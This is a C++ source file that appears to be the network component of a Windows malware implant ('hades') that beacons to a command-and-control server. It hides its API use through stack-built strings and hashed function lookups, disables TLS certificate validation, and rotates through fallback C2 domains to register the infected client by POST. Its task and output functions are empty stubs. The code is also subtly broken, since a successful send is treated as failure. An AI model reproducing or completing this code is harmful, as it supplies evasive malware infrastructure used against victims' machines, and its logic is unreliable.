#include "network.hpp"
#include "../hades/hades.h"
#include "../hades/config.hpp"
#include <stdio.h>



Network::Network() {
	this->HttpApis = AllocMemory<HTTPAPIS>(sizeof(struct HTTPAPIS));
	char buf[12];
	buf[0]  = 'w';
	buf[1]  = 'i';
	buf[2]  = 'n';
	buf[3]  = 'i';
	buf[4]  = 'n';
	buf[5]  = 'e';
	buf[6]  = 't';
	buf[7]  = '.';
	buf[8]  = 'd';
	buf[9]  = 'l';
	buf[10] = 'l';
	buf[11] = '\0';

	hades->Modules.WININET = hades->WinApis.LoadLibraryA(buf);
	if (hades->Modules.WININET) {
		this->HttpApis->InternetOpenA          = (decltype(this->HttpApis->InternetOpenA))GetProc(hades->Modules.WININET, HASHED_InternerOpenA);
		this->HttpApis->HttpAddRequestHeadersA = (decltype(this->HttpApis->HttpAddRequestHeadersA))GetProc(hades->Modules.WININET, HASHED_AddHeaders);
		this->HttpApis->HttpOpenRequestA	   = (decltype(this->HttpApis->HttpOpenRequestA))GetProc(hades->Modules.WININET, HASHED_OpenRequest);
		this->HttpApis->HttpSendRequestA	   = (decltype(this->HttpApis->HttpSendRequestA))GetProc(hades->Modules.WININET, HASHED_SendRequest);
		this->HttpApis->InternetCloseHandle	   = (decltype(this->HttpApis->InternetCloseHandle))GetProc(hades->Modules.WININET, HASHED_InternetCloseHandle);
		this->HttpApis->InternetConnectA	   = (decltype(this->HttpApis->InternetConnectA))GetProc(hades->Modules.WININET, HASHED_InternetConnect);
		this->HttpApis->InternetReadFile	   = (decltype(this->HttpApis->InternetReadFile))GetProc(hades->Modules.WININET, HASHED_InternetReadFile);
		this->HttpApis->InternetSetOptionA	   = (decltype(this->HttpApis->InternetSetOptionA))GetProc(hades->Modules.WININET, HASHED_InternetSetOptionA);
	}

	this->reqFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
					 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD;

}



BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {
	BOOL isRegistered = FALSE;

	HINTERNET hInternrt = NULL, hConnect = NULL, hRequest = NULL;

	for (int i = 0; i < conf->domaincounts && !isRegistered; i++) {
		if (conf->domains[i].isDead) {
			continue;
		}

		UINT retrys = MAX_RETRYS;
		while (--retrys) {

			DWORD flags = this->reqFlags;
			BOOL ok = FALSE;
			hInternrt = this->HttpApis->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
			if (!hInternrt) goto CLEANUP;

			hConnect = this->HttpApis->InternetConnectA(hInternrt, conf->domains[i].domain, conf->domains[i].port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
			if (!hConnect) goto CLEANUP;

			
			if (conf->domains[i].isHttps) {
				flags |= INTERNET_FLAG_SECURE;
			}

			hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "POST", conf->PostEndpoint, NULL, NULL, NULL, flags, 0);
			if (!hRequest) goto CLEANUP;
			this->HttpApis->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

			if (this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, (LPVOID)Data, DataLength)) goto CLEANUP;
			ok = TRUE;
			
		CLEANUP:
			if (hRequest) { this->HttpApis->InternetCloseHandle(hRequest); hRequest = NULL; }
			if (hConnect) { this->HttpApis->InternetCloseHandle(hConnect); hConnect = NULL; }
			if (hInternrt){ this->HttpApis->InternetCloseHandle(hInternrt); hInternrt = NULL; }

			if (ok) {
				isRegistered = TRUE;
				break;
			}

			LARGE_INTEGER delay;
			delay.QuadPart = -(LONGLONG)(BASE_DELAY_MS * (1 << i)) * 1000;
			hades->NtApis.NtDelayExecution(FALSE, &delay);
			
		}

		if (!isRegistered) {
			if   (conf->domains[i].isSecondChance) { conf->domains[i].isDead = TRUE; }
			else { conf->domains[i].isSecondChance = TRUE; }
		}


	}
	return isRegistered;
}


BOOL Network::GetTask(PBYTE OutData, SIZE_T BufSize) {
	return TRUE;
}


BOOL Network::SendOutput(PBYTE InData, SIZE_T InLen) {
	return TRUE;
}

Network* g_Network = NULL;